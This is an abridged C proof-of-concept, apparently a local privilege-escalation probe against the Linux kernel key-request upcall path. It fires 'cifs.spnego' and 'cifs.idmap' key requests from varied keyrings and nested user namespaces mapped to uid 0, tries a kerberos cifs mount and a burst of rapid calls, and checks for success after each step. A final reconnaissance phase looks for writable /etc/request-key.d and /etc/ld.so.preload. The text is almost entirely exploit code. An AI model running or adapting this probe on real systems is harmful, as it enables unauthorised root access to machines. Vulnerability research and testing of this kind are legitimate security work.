...
int main(int argc, char **argv)
{
        ...
        /* === PHASE A: Try cifs.spnego with different dest keyrings === */
        {
                int keyrings[] = {
                        ...
                        -5,  /* KEY_SPEC_USER_SESSION_KEYRING */
                         0,  /* no specific keyring */
                };
                const char *kr_names[] = {
                        "session", "thread", "process", "user", "user_session", "zero"
                };
                int nk = sizeof(keyrings)/sizeof(keyrings[0]);
                fprintf(stderr, "\n[A] cifs.spnego with different keyrings\n");
                for (int i = 0; i < nk; i++) {
                        errno = 0;
                        ret = syscall(NR_request_key, "cifs.spnego", desc, "",
                                      keyrings[i]);
                        fprintf(stderr, "    [%s] rc=%ld errno=%d (%s)\n",
                                kr_names[i], ret, errno, strerror(errno));
                        if (ret >= 0) { sleep(3); if (check_evidence()) return 0; }
                }
        }

        /* === PHASE B: Nested user namespaces (depth 2, 3) === */
        fprintf(stderr, "\n[B] cifs.spnego from nested user namespaces\n");
        {
                int depths[] = {2, 3, 4};
                for (int di = 0; di < 3; di++) {
                        ...
                        if (p == 0) {
                                ...
                                for (int d = 0; d < depth; d++) {
                                        ...
                                        /* map uid 0 in each level */
                                        int mapfd = open("/proc/self/uid_map", O_WRONLY);
                                        if (mapfd >= 0) {
                                                dprintf(mapfd, "0 0 1\n");
                                                close(mapfd);
                                        }
                                        int sgfd = open("/proc/self/setgroups", O_WRONLY);
                                        if (sgfd >= 0) {
                                                write(sgfd, "deny", 4);
                                                close(sgfd);
                                        }
                                        int gmapfd = open("/proc/self/gid_map", O_WRONLY);
                                        if (gmapfd >= 0) {
                                                dprintf(gmapfd, "0 0 1\n");
                                                close(gmapfd);
                                        }
                                }
                                errno = 0;
                        ...
                        fprintf(stderr, "    [depth=%d] rc=%ld errno=%d (%s)\n",
                                depth, rc2, err2, strerror(err2));
                        if (rc2 >= 0) { sleep(3); if (check_evidence()) return 0; }
                }
        }

        /* === PHASE C: Try NULL callout (search-only, no handler) + then with callout variants === */
        fprintf(stderr, "\n[C] cifs.spnego callout variants\n");
        {
                errno = 0;
                ret = syscall(NR_request_key, "cifs.spnego", desc, (void*)0,
                              KEY_SPEC_SESSION_KEYRING);
                fprintf(stderr, "    [null callout] rc=%ld errno=%d (%s)\n",
                        ret, errno, strerror(errno));

                errno = 0;
                ret = syscall(NR_request_key, "cifs.spnego", desc, "x",
                              KEY_SPEC_SESSION_KEYRING);
                fprintf(stderr, "    [callout='x'] rc=%ld errno=%d (%s)\n",
                        ret, errno, strerror(errno));
        }

        /* === PHASE D: Try mount -t cifs (kernel-internal key creation) === */
        fprintf(stderr, "\n[D] mount -t cifs (kernel path)\n");
        {
                mkdir("/tmp/cifs_poc_mnt", 0755);
                errno = 0;
                int mrc = mount("//127.0.0.1/test", "/tmp/cifs_poc_mnt", "cifs", 0,
                                "username=x,password=x,sec=krb5");
                fprintf(stderr, "    mount rc=%d errno=%d (%s)\n",
                        mrc, errno, strerror(errno));
                if (mrc == 0) {
                        umount("/tmp/cifs_poc_mnt");
                }
                sleep(2);
                if (check_evidence()) return 0;
        }

        /* === PHASE E: Burst — rapid request_key in tight loop === */
        fprintf(stderr, "\n[E] cifs.spnego burst (1000 rapid calls)\n");
        {
                int ok = 0;
                ...
                if (ok) { sleep(3); if (check_evidence()) return 0; }
        }

        /* === PHASE F: cifs.idmap (root handler, check for evidence) === */
        fprintf(stderr, "\n[F] request_key(cifs.idmap) — root handler\n");
        errno = 0;
        ...
        /* === PHASE G: Recon — check mount.cifs permissions === */
        fprintf(stderr, "\n[G] Recon\n");
        {
                struct stat st;
                const char *bins[] = {
                        "/usr/sbin/mount.cifs", "/sbin/mount.cifs",
                        "/usr/bin/mount.cifs", NULL
                };
                for (int i = 0; bins[i]; i++) {
                        if (stat(bins[i], &st) == 0) {
                                fprintf(stderr, "    %s mode=%o uid=%d\n",
                                        bins[i], st.st_mode & 07777, st.st_uid);
                        }
                }
                /* Check if /etc/request-key.d is writable */
                if (access("/etc/request-key.d", W_OK) == 0)
                        fprintf(stderr, "    /etc/request-key.d IS WRITABLE!\n");
                else
                        fprintf(stderr, "    /etc/request-key.d not writable\n");

                /* Check ld.so.preload */
                if (access("/etc/ld.so.preload", F_OK) == 0)
                        fprintf(stderr, "    /etc/ld.so.preload exists (writable=%d)\n",
                                access("/etc/ld.so.preload", W_OK) == 0);
                else
                        fprintf(stderr, "    /etc/ld.so.preload does not exist\n");
        }
